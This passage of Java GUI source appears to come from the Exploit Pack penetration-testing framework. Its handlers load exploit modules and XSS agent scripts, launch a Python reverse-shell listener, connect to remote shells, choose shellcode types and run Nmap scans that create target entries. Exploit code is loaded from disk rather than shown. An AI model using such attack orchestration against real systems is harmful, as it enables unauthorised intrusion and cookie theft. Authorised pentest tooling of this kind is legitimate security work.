    private void jMenuItem18ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem18ActionPerformed
        // TODO add your handling code here:
        UpdateManager.main(null);
    }//GEN-LAST:event_jMenuItem18ActionPerformed

    private void jMenuItem25ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem25ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem25ActionPerformed

    private void jMenuItem26ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem26ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem26ActionPerformed

    private void jMenuItem27ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem27ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem27ActionPerformed

    private void jMenuItem28ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem28ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem28ActionPerformed

    private void jMenuItem29ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem29ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem29ActionPerformed

    private void jMenuItem30ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem30ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem30ActionPerformed

    private void jMenuItem31ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem31ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem31ActionPerformed

    private void jMenuItem32ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem32ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem32ActionPerformed

    private void jMenuItem33ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem33ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem33ActionPerformed

    private void jMenuItem34ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem34ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem34ActionPerformed

    private void jMenuItem35ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem35ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem35ActionPerformed

    private void jMenuItem36ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem36ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem36ActionPerformed

    private void jMenuItem37ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem37ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem37ActionPerformed

    private void jMenuItem38ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem38ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem38ActionPerformed

    private void jMenuItem39ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem39ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem39ActionPerformed

    private void jMenuItem40ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem40ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem40ActionPerformed

    private void jMenuItem41ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem41ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem41ActionPerformed

    private void jMenuItem42ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem42ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem42ActionPerformed

    private void jMenuItem19ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem19ActionPerformed
        // TODO add your handling code here:
        String url = "https://exploitpack.freshdesk.com/support/home";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem19ActionPerformed

    private void jMenuItem20ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem20ActionPerformed
        // TODO add your handling code here:
        String url = "https://juansacco.gitbooks.io/exploitpack/content/";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem20ActionPerformed

    private void jMenuItem21ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem21ActionPerformed
        // TODO add your handling code here:
        UpdateManager.main(null);
    }//GEN-LAST:event_jMenuItem21ActionPerformed

    private void jMenuItem22ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem22ActionPerformed
        // TODO add your handling code here:
        String url = "http://www.gnu.org/licenses/gpl-3.0-standalone.html";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem22ActionPerformed

    private void jMenuItem23ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem23ActionPerformed
        // TODO add your handling code here:
        RegisterForm.main(null);
    }//GEN-LAST:event_jMenuItem23ActionPerformed

    private void jMenuItem43ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem43ActionPerformed
        // TODO add your handling code here:
        ViewLog.main(null);
    }//GEN-LAST:event_jMenuItem43ActionPerformed

    private void jMenuItem24ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem24ActionPerformed
        // TODO add your handling code here:
        About.main(null);
    }//GEN-LAST:event_jMenuItem24ActionPerformed

    private void jTreeRATMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTreeRATMouseClicked
        // TODO add your handling code here:
        //jButtonExecution.setText("Save & Send to shell");
    }//GEN-LAST:event_jTreeRATMouseClicked

    private void jTreeRATValueChanged(javax.swing.event.TreeSelectionEvent evt) {//GEN-FIRST:event_jTreeRATValueChanged
        // TODO add your handling code here:
        try {
            String ExploitSelection = evt.getPath().getPath()[2].toString();
            // Check if the selected item is a RAT session
            jButtonExecution.setText("Send to Shell");
            jTextFieldTargetH.setText(ExploitSelection);

            // QuickInformation
            ExploitSelection = ExploitSelection.concat(".xml");

            // Clean QuickInformation
            jTextAreaQuickInfo.setText("");

            // Start de la clase main de XMLTreenode
            NewXMLNode.main(null, ExploitSelection);
            jTextAreaQuickInfo.append("Shell Session name: "
                    + NewXMLNode.ExploitName + "\n");
            jTextAreaQuickInfo.append("Owner: "
                    + NewXMLNode.Author + "\n");
            jTextAreaQuickInfo.append("Session type: "
                    + NewXMLNode.ExploitType + "\n");
            jTextAreaQuickInfo.append("Last connection: "
                    + NewXMLNode.Vulnerability + "\n");
            jTextAreaQuickInfo.append("Creation date: "
                    + NewXMLNode.Date);
            jTextAreaQuickInfo.append(NewXMLNode.Information);
            jTextAreaQuickInfo.setCaretPosition(0);

            // Set new instance of exploit
            exploit.setModuleName(NewXMLNode.ExploitName);
            exploit.setCodeName(NewXMLNode.CodeName);
            exploit.setType(NewXMLNode.ExploitType);
            exploit.setPlatform(NewXMLNode.Platform);
            exploit.setService(NewXMLNode.Service);
            exploit.setShellcodePort(NewXMLNode.ShellPort);
            exploit.setRemotePort(NewXMLNode.RemotePort);
            exploit.setShellcodeAvail(NewXMLNode.ShellcodeAvailable);
            exploit.setInformation(NewXMLNode.Information);
            exploit.setSpecialArgs(NewXMLNode.SpecialArgs);
            exploit.setAuthor(NewXMLNode.Author);
            exploit.setVulnerability(NewXMLNode.Vulnerability);
            exploit.setTargets(NewXMLNode.Targets);

            jTextFieldTargetP.setText(xssAgent.getId());
            jTextFieldLocalHost.setText(exploit.getSpecialArgs().replaceAll("%20", " "));
            jTextFieldshellPort.setText(exploit.getRemotePort().replaceAll("%20", " "));
            jTextFieldExtraOptions.setText(exploit.getShellcodePort().replaceAll("%20", " "));

            if (exploit.getPlatform().equals("xss")) {
                try {
                    jLabel8.setText("Remote OS:");
                    jLabel8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/application.png")));
                    jLabel7.setText("Remote IP:");
                    jLabel7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/networking.png")));
                    jLabel6.setText("Browser:");
                    jLabel6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/world.png")));
                    jLabel2.setText("ID Full:");
                    jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/agent.png")));
                    jLabel3.setText("Cookie:");
                    jLabel3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/cookie.png")));

                    StringBuilder sb;
                    try (BufferedReader fileInput = new BufferedReader(new FileReader("exploits/code/" + jTextFieldTargetH.getText() + ".js"))) {
                        String text = null;
                        sb = new StringBuilder();
                        do {
                            if (text != null) {
                                sb.append(text).append("\n");
                            }
                        } while ((text = fileInput.readLine()) != null);

                    }
                    jTextAreaModuleEditor.setText(sb.toString());
                    jTextAreaModuleEditor.setCaretPosition(0);
                    jButtonExecution.setText("Save & Execute");

                } catch (IOException e1) {
                    Logger.getLogger(MainFrame.class
                            .getName()).log(Level.SEVERE, null, e1);
                }
            }
            if (ExploitSelection.contains("- Shell")) {
                jButtonExecution.setText("Remote shell");
                jTextFieldTargetH.setText(ExploitSelection.replace("- Shell", "").replace(".xml", ""));
            }
        } catch (Exception e) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, e);
        }
    }//GEN-LAST:event_jTreeRATValueChanged

    private void jTreeExploitsMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTreeExploitsMouseClicked
        // TODO add your handling code here:
        jButtonExecution.setText("Save & Execute");
    }//GEN-LAST:event_jTreeExploitsMouseClicked

    private void jTreeExploitsValueChanged(javax.swing.event.TreeSelectionEvent evt) {//GEN-FIRST:event_jTreeExploitsValueChanged
        jTabbedPane.setSelectedIndex(0);
        String ExploitSelection = evt.getPath().getPath()[2].toString();
        jProgressBarModuleStatus.setValue(0);
        if (!"Hostname:".equals(jLabel8.getText())) {
            jLabel8.setText("Hostname:");
            jLabel8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/home.png"))); // NOI18N
            jLabel7.setText("Shell data:");
            jLabel7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/localport.png"))); // NOI18N
            jLabel6.setText("Arguments:");
            jLabel6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/options.png"))); // NOI18N
            jLabel2.setText("Target:");
            jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/target.png"))); // NOI18N
            jLabel3.setText("Path:");
            jLabel3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/port.png"))); // NOI18N
        }
        try {
            jTreeRAT.setSelectionRow(-1);

        } catch (Exception e) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.INFO, null, e);
        }

        // Check if the selected item is part of these categories
        if (ExploitSelection.equals("Exploits")
                || ExploitSelection.equals("Windows")
                || ExploitSelection.equals("BSD")
                || ExploitSelection.equals("Unix")
                || ExploitSelection.equals("Linux")
                || ExploitSelection.equals("Tools")
                || ExploitSelection.equals("Search")
                || ExploitSelection.equals("History")
                || ExploitSelection.equals("Personal")
                || ExploitSelection.startsWith("RAT")
                || Character.isDigit(ExploitSelection.charAt(0))
                || ExploitSelection.equals("Data")) {
        } else {
            if (LastTreeItemSelected != null) {
                DefaultTreeCellRenderer renderer = new DefaultTreeCellRenderer();
                renderer.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
                renderer.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/folderselect.png"))));
                renderer.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/scriptselect.png"))));
                //selectedElement.setUserObject(renderer);
            }
            DefaultTreeCellRenderer renderer = new DefaultTreeCellRenderer();
            renderer.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
            renderer.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/folderselect.png"))));
            renderer.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/scriptnormal.png"))));
            //selectedElement.setUserObject(renderer);

            //jTreeExploits.setCellRenderer(renderer);
            LastTreeItemSelected = ExploitSelection;

            // QuickInformation
            ExploitSelection = ExploitSelection.concat(".xml");

            // Clean QuickInformation
            jTextAreaQuickInfo.setText("");

            // Start de la clase main de XMLTreenode
            NewXMLNode.main(null, ExploitSelection);
            jTextAreaQuickInfo.append("Exploit Name: "
                    + NewXMLNode.ExploitName + "\n");
            jTextAreaQuickInfo.append("Author of this module: "
                    + NewXMLNode.Author + "\n");
            jTextAreaQuickInfo.append("Type of exploit: "
                    + NewXMLNode.ExploitType + "\n");
            jTextAreaQuickInfo.append("CVE ( Mitre ID ): "
                    + NewXMLNode.Vulnerability + "\n");
            jTextAreaQuickInfo.append("Disclosure Date: "
                    + NewXMLNode.Date + "\n");
            jTextAreaQuickInfo.append("Platform: "
                    + NewXMLNode.Platform);
            jTextAreaQuickInfo.append(NewXMLNode.Information);
            jTextAreaQuickInfo.setCaretPosition(0);

            // Set new instance of exploit
            exploit.setModuleName(NewXMLNode.ExploitName);
            exploit.setCodeName(NewXMLNode.CodeName);
            exploit.setType(NewXMLNode.ExploitType);
            exploit.setPlatform(NewXMLNode.Platform);
            exploit.setService(NewXMLNode.Service);
            exploit.setShellcodePort(NewXMLNode.ShellPort);
            exploit.setRemotePort(NewXMLNode.RemotePort);
            exploit.setShellcodeAvail(NewXMLNode.ShellcodeAvailable);
            exploit.setInformation(NewXMLNode.Information);
            exploit.setSpecialArgs(NewXMLNode.SpecialArgs);
            exploit.setAuthor(NewXMLNode.Author);
            exploit.setVulnerability(NewXMLNode.Vulnerability);
            exploit.setTargets(NewXMLNode.Targets);
            jTextFieldshellPort.setText(NewXMLNode.ShellPort);
            jTextFieldTargetP.setText(NewXMLNode.RemotePort);

            // Set shellcodes for comboshell
            jComboBoxShellcode.removeAllItems();
            // Load available shellcodes
            if (NewXMLNode.ShellcodeAvailable.contains("R")) {
                jComboBoxShellcode.addItem("Remote Shell");
            }
            if (NewXMLNode.ShellcodeAvailable.contains("E")) {
                jComboBoxShellcode.addItem("Execute Code");
            }
            if (NewXMLNode.ShellcodeAvailable.contains("C")) {
                jComboBoxShellcode.addItem("Command");
            }
            if (NewXMLNode.ShellcodeAvailable.contains("L")) {
                jComboBoxShellcode.addItem("Local Shell");
            }
            jComboBoxShellcode.repaint();

            try {
                StringBuilder sb;
                try (BufferedReader fileInput = new BufferedReader(new FileReader("exploits/code/" + exploit.getCodeName()))) {
                    String text = null;
                    sb = new StringBuilder();
                    do {
                        if (text != null) {
                            sb.append(text).append("\n");
                        }
                    } while ((text = fileInput.readLine()) != null);

                }
                jTextAreaModuleEditor.setText(sb.toString());
                jTextAreaModuleEditor.setCaretPosition(0);
                jButtonExecution.setText("Save & Execute");

            } catch (IOException e1) {
                Logger.getLogger(MainFrame.class
                        .getName()).log(Level.SEVERE, null, e1);
            }
        }
    }//GEN-LAST:event_jTreeExploitsValueChanged

    private void jTreeToolsMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTreeToolsMouseClicked
        // TODO add your handling code here:
        jButtonExecution.setText("Execute Auxiliary");
    }//GEN-LAST:event_jTreeToolsMouseClicked

    private void jTreeToolsValueChanged(javax.swing.event.TreeSelectionEvent evt) {//GEN-FIRST:event_jTreeToolsValueChanged
        // TODO add your handling code here:
        jTabbedPane.setSelectedIndex(0);
        jButtonExecution.setText("Execute Auxiliary");
        jTreeRAT.setSelectionRow(-1);
        String ExploitSelection = evt.getPath().getPath()[2].toString();
        ExploitSelection = ExploitSelection.concat(".xml");
        // Clean QuickInformation
        jTextAreaQuickInfo.setText("");
        //Check for icons and labels   

        if (!"Hostname:".equals(jLabel8.getText())) {
            jLabel8.setText("Hostname:");
            jLabel8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/home.png"))); // NOI18N
            jLabel7.setText("Shell data:");
            jLabel7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/localport.png"))); // NOI18N
            jLabel6.setText("Arguments:");
            jLabel6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/options.png"))); // NOI18N
            jLabel2.setText("Target:");
            jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/target.png"))); // NOI18N
            jLabel3.setText("Path:");
            jLabel3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/port.png"))); // NOI18N
        }
        // Start de la clase main de XMLTreenode
        NewXMLNode.main(null, ExploitSelection);
        jTextAreaQuickInfo.append("Exploit Name: "
                + NewXMLNode.ExploitName + "\n");
        jTextAreaQuickInfo.append("Author of this module: "
                + NewXMLNode.Author + "\n");
        jTextAreaQuickInfo.append("Type of exploit: "
                + NewXMLNode.ExploitType + "\n");
        jTextAreaQuickInfo.append("CVE ( Mitre ID ): "
                + NewXMLNode.Vulnerability + "\n");
        jTextAreaQuickInfo.append("Disclosure Date: "
                + NewXMLNode.Date);
        jTextAreaQuickInfo.append(NewXMLNode.Information);
        jTextAreaQuickInfo.setCaretPosition(0);

        // Set new instance of exploit
        exploit.setModuleName(NewXMLNode.ExploitName);
        exploit.setCodeName(NewXMLNode.CodeName);
        exploit.setType(NewXMLNode.ExploitType);
        exploit.setPlatform(NewXMLNode.Platform);
        exploit.setService(NewXMLNode.Service);
        exploit.setShellcodePort(NewXMLNode.ShellPort);
        exploit.setRemotePort(NewXMLNode.RemotePort);
        exploit.setShellcodeAvail(NewXMLNode.ShellcodeAvailable);
        exploit.setInformation(NewXMLNode.Information);
        exploit.setSpecialArgs(NewXMLNode.SpecialArgs);
        exploit.setAuthor(NewXMLNode.Author);
        exploit.setVulnerability(NewXMLNode.Vulnerability);
        exploit.setTargets(NewXMLNode.Targets);

        try {
            StringBuilder sb;
            try (BufferedReader fileInput = new BufferedReader(new FileReader("exploits/code/" + exploit.getCodeName()))) {
                String text = null;
                sb = new StringBuilder();
                do {
                    if (text != null) {
                        sb.append(text).append("\n");
                    }
                } while ((text = fileInput.readLine()) != null);

            }
            jTextAreaModuleEditor.setText(sb.toString());
            jTextAreaModuleEditor.setCaretPosition(0);

        } catch (IOException e1) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, e1);
        }
    }//GEN-LAST:event_jTreeToolsValueChanged

    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed
        // TODO add your handling code here:
        NewProject.main(null);
    }//GEN-LAST:event_jButton4ActionPerformed

    private void jButton10ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton10ActionPerformed
        // TODO add your handling code here:
        ViewLog.main(null);
    }//GEN-LAST:event_jButton10ActionPerformed

    private void jButton12ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton12ActionPerformed
        // TODO add your handling code here:
        UpdateManager.main(null);
    }//GEN-LAST:event_jButton12ActionPerformed

    private void jButton13ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton13ActionPerformed
        // TODO add your handling code here:
        ShellWizard.main(null);
    }//GEN-LAST:event_jButton13ActionPerformed

    private void jButton14ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton14ActionPerformed
        // TODO add your handling code here:
        AutoPwn.main(null);
    }//GEN-LAST:event_jButton14ActionPerformed

    private void jButtonExecutionActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonExecutionActionPerformed
        try {
            // Check if there is something selected
            if (jButtonExecution.getText().equals("Execute Module")) {
                JOptionPane.showMessageDialog(null, "Please choose a module.", "Exploit Pack says:", JOptionPane.ERROR_MESSAGE);
                return;
            }

            if (jButtonExecution.getText().equals("Remote shell")) {
                Connect.main(null, jTextFieldTargetH.getText().toString().replaceAll("- Shell", ""), jTextFieldshellPort.getText());
            }

            if (exploit.getPlatform().equals("xss")) {
                File fileXSS = new File("exploits/code/"
                        + exploit.getCodeName() + ".js");
                BufferedWriter outputXSS;
                outputXSS = new BufferedWriter(
                        new FileWriter(fileXSS));
                outputXSS.write(jTextAreaModuleEditor.getText());
                outputXSS.close();

                // Save XSS
                File file = new File("exploits/code/" + exploit.getCodeName());
                try (FileWriter fileWriter = new FileWriter(file)) {
                    fileWriter.write("Flow(\"executed\")" + jTextAreaModuleEditor.getText());
                } catch (IOException e) {
                }
            } else {
                // Save Exploit
                File file = new File("exploits/code/" + exploit.getCodeName());
                try (FileWriter fileWriter = new FileWriter(file)) {
                    fileWriter.write(jTextAreaModuleEditor.getText());
                } catch (IOException e) {
                }
            }

            // Launch Reverse Shell Client
            if (exploit.getPlatform().equals("rat")) {
                multiServerip = jTextFieldTargetH.getText();
                multiServerport = jTextFieldTargetP.getText();
                String cmd = pythonpath + " data/agent/agentserver.py " + multiServerport;
                Runtime.getRuntime().exec(cmd);

                // Exec wav RAT
                AudioInputStream s;
                AudioFormat f;
                DataLine.Info i;
                File inputFile = new File("data/newconnectiontorat.wav");
                Clip c;
                s = AudioSystem.getAudioInputStream(inputFile);
                f = s.getFormat();
                i
                        = new DataLine.Info(Clip.class, f);
                c = (Clip) AudioSystem.getLine(i);
                c.open(s);
                c.start();
                jProgressBarModuleStatus.setValue(100);
            }

            // Launch scanner
            if (exploit.getModuleName().equals("Nmap-scanner")) {
                final Thread scannerThread;
                scannerThread = new Thread("scannerThread") {

                    @Override
                    public void run() {
                        try {
                            // Exec wav RAT
                            AudioInputStream sourceAux;
                            AudioFormat f;
                            DataLine.Info inputAux;
                            File inputFileAux = new File("data/newauxiliarydeployed.wav");
                            Clip c;
                            sourceAux = AudioSystem.getAudioInputStream(inputFileAux);
                            f = sourceAux.getFormat();
                            inputAux = new DataLine.Info(Clip.class, f);
                            c = (Clip) AudioSystem.getLine(inputAux);
                            c.open(sourceAux);
                            c.start();

                            // Exec scan
                            JOptionPane.showMessageDialog(null, "Please wait, the scan could take a few minutes", "Exploit Pack says:", JOptionPane.INFORMATION_MESSAGE);
                            jProgressBarModuleStatus.setValue(40);
                            String cmd = nmappath + " " + ScannerOptions + " " + jTextFieldTargetH.getText() + " -oX log/" + jTextFieldTargetH.getText() + ".xml";
                            Process proc = Runtime.getRuntime().exec(cmd);
                            try (BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getErrorStream()))) {
                                String line = null;

                                while ((line = reader.readLine()) != null) {
                                    Logger.getLogger(MainFrame.class
                                            .getName()).log(Level.SEVERE, null, line);
                                }
                            }
                            jProgressBarModuleStatus.setValue(60);
                            DefaultTreeModel modelScanner = (DefaultTreeModel) jTreeRemoteScanner.getModel();
                            DefaultMutableTreeNode rootScanner = (DefaultMutableTreeNode) modelScanner.getChild(modelScanner.getRoot(), 0);
                            rootScanner.add(new DefaultMutableTreeNode("Target: " + jTextFieldTargetH.getText()));
                            jTreeRemoteScanner.expandRow(0);
                            modelScanner.reload(rootScanner);
                            jProgressBarModuleStatus.setValue(80);
                            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
                            DocumentBuilder dBuilder;
                            dBuilder = dbFactory.newDocumentBuilder();
                            Document doc = dBuilder.parse(new File("log/" + jTextFieldTargetH.getText() + ".xml"));
                            doc.getDocumentElement().normalize();
                            NodeList nList = doc.getElementsByTagName("port");
                            String openports = null;
                            for (int temp = 0; temp < nList.getLength(); temp++) {
                                Node nNode = nList.item(temp);
                                if (nNode.getNodeType() == Node.ELEMENT_NODE) {
                                    Element eElement = (Element) nNode;
                                    DefaultTreeModel modelModuleStatus = (DefaultTreeModel) jTreeRemoteScanner.getModel();
                                    DefaultMutableTreeNode rootStatus = (DefaultMutableTreeNode) modelModuleStatus.getChild(modelModuleStatus.getRoot(), 0);
                                    rootStatus.add(new DefaultMutableTreeNode("Open "
                                            + eElement
                                                    .getAttribute("protocol")
                                            + " / "
                                            + eElement
                                                    .getAttribute("portid")));

                                    openports += "Protocol: " + eElement.getAttribute("protocol")
                                            + " / "
                                            + "Open port: " + eElement.getAttribute("portid") + " Service: " + eElement.getAttribute("product") + "\n";
                                    jTreeRemoteScanner.expandRow(0);
                                    modelModuleStatus.reload(rootStatus);

                                    // Create target
                                    FileWriter fstream = null;
                                    try {
                                        String name = jTextFieldTargetH.getText();
                                        fstream = new FileWriter("exploits/" + name + ".xml");
                                        BufferedWriter out = new BufferedWriter(fstream);
                                        java.util.Date date = new java.util.Date();
                                        out.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
                                        out.write("<Module><Exploit NameXML=\""
                                                + name
                                                + "\" CodeName=\"" + name + ".txt" + "\"  Platform=\"" + "windows" + "\" Service=\"" + "" + "\" Type=\"" + "notepad" + "\" RemotePort=\"" + "" + "\" LocalPort=\"\" ShellcodeAvailable=\"" + "" + "\" ShellPort=\"4444\" SpecialArgs=\"" + "" + "\"></Exploit>");
                                        out.write("<Information Author=\"" + "ExploitPack" + "\" Date=\""
                                                + new Timestamp(date.getTime())
                                                + "\" Vulnerability=\""
                                                + "none"
                                                + "\">\r\n" + "" + "</Information><Targets>" + "" + "</Targets></Module>");
                                        out.close();
                                        fstream = new FileWriter("exploits/code/" + name + ".txt");
                                        BufferedWriter outCode = new BufferedWriter(fstream);

                                        pentestNote.insert(0, "# Pentest notes for: " + jTextFieldTargetH.getText() + "\n");
                                        pentestNote.append(openports);
                                        outCode.write(pentestNote.toString().replaceAll("^,", "").replaceAll(",,", ",").replaceAll(",$", "").replaceAll("null", ""));
                                        outCode.close();

                                    } catch (IOException ex) {
                                        Logger.getLogger(Notepad.class
                                                .getName()).log(Level.SEVERE, null, ex);
                                    } finally {
                                        try {
                                            fstream.close();

                                        } catch (IOException ex) {
                                            Logger.getLogger(Notepad.class
                                                    .getName()).log(Level.SEVERE, null, ex);
                                        }
                                    }
                                }
                            }
                            jMenuItem12.doClick();
                            jProgressBarModuleStatus.setValue(100);
                            JOptionPane.showMessageDialog(null, jTextFieldTargetH.getText() + " added successfully to your targets.", "Exploit Pack says:", JOptionPane.INFORMATION_MESSAGE);

                        } catch (IOException | SAXException | ParserConfigurationException ex) {
                            Logger.getLogger(MainFrame.class
                                    .getName()).log(Level.SEVERE, null, ex);
                            JOptionPane.showMessageDialog(null, "Nmap not found on your system, please check your preferences.", "Exploit Pack says:", JOptionPane.ERROR_MESSAGE);

                        } catch (UnsupportedAudioFileException | LineUnavailableException ex) {
                            Logger.getLogger(MainFrame.class
                                    .getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                };
                scannerThread.start();
            }

            // Launch Exploit
            if (exploit.getType().equals("remote") || exploit.getType().equals("local") || exploit.getType().equals("clientside")) {
                // Exec wav Exploit
                AudioInputStream s;
                AudioFormat f;
                DataLine.Info i;
                File inputFile = new File("data/newexploit.wav");
                Clip c;
                s = AudioSystem.getAudioInputStream(inputFile);
                f = s.getFormat();
                i = new DataLine.Info(Clip.class, f);
                c = (Clip) AudioSystem.getLine(i);
                c.open(s);
                c.start();

                // Shellcode Remote Shell
                if (jComboBoxShellcode.getSelectedItem().toString().equals("Remote Shell")) {
                    ShellcodeSelected = "R";
                    boolean ratNew = false;

                    DefaultTreeModel modelRAT = (DefaultTreeModel) jTreeRAT.getModel();
                    DefaultMutableTreeNode rootRAT = (DefaultMutableTreeNode) modelRAT.getChild(modelRAT.getRoot(), 0);

                    ArrayList ratList = new ArrayList();
                    DefaultMutableTreeNode rootRATcheck = rootRAT.getNextNode();

                    for (int e = 0; e < rootRAT.getChildCount(); e++) {
                        ratList.add(rootRATcheck.getParent().getChildAt(e).toString());
                    }
                    if (!ratList.contains((jTextFieldTargetH.getText() + "- Shell"))) {
                        ratNew = true;
                    }
                    if (ratNew) {
                        rootRAT.add(new DefaultMutableTreeNode(jTextFieldTargetH.getText() + "- Shell"));
                        jTreeRAT.expandRow(0);
                        modelRAT.reload(rootRAT);
                    }

                }
                // Shellcode execute code
                if (jComboBoxShellcode.getSelectedItem().toString().equals("Execute Code")) {
                    ShellcodeSelected = "";
                }
                // Shellcode command
                if (jComboBoxShellcode.getSelectedItem().toString().equals("Command")) {
                    ShellcodeSelected = "C";
                }
                // Shellcode local
                if (jComboBoxShellcode.getSelectedItem().toString().equals("Local Shell")) {
                    ShellcodeSelected = "L";
                }
                // Shellcode local
                if (jComboBoxShellcode.getSelectedItem().toString().equals("Shelcode..")
                        || jComboBoxShellcode.getSelectedItem().toString().equals("")) {
                    ShellcodeSelected = "N";
                }

                if ("touch /tmp/ep".equals(jTextFieldExtraOptions.getText())) {
                    jTextFieldExtraOptions.setText("");
                }

                // Set exec options for remote
                if (exploit.getType().equals("remote")) {
